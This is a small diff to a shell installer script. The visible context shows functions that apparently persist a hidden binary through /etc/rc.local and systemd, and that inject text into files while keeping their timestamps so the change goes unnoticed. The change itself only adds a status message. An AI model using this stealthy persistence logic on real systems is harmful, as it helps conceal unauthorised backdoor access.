@@ -1305,8 +1305,6 @@ install_system_systemd()
 	return 255
 }
 
-
-
 # inject a string ($2-) into the 2nd line of a file and retain the
 # PERM/TIMESTAMP of the target file ($1)
 install_to_file()
@@ -1331,6 +1329,8 @@ install_system_rclocal()
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
 	# Some systems have /etc/rc.local but it's not executeable...
 	[[ ! -x "${RCLOCAL_FILE}" ]] && return
+	echo -en "Installing access /etc/rc.local......................................."
+
 	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
